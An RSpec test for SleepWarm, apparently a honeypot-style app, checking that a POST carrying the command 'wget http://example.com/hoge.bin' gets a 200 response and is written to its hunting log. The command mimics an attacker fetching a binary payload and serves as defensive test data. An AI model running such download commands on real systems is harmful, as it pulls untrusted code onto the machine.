describe SleepWarm::Application do
  include_context "huntup testing"

  context "POST with wget" do
    it "responds with a 200 OK" do
      post 'http://example.com/', "wget http://example.com/hoge.bin"
      expect(last_response.status).to eq(200)
      expect(last_response.body).not_to be_empty
      @hunting_log.rewind
      hunting_log = @hunting_log.read
      expect(hunting_log).to include("wget http://example.com/hoge.bin")
      expect(hunting_log).to end_with("\n")
    end
  end
end
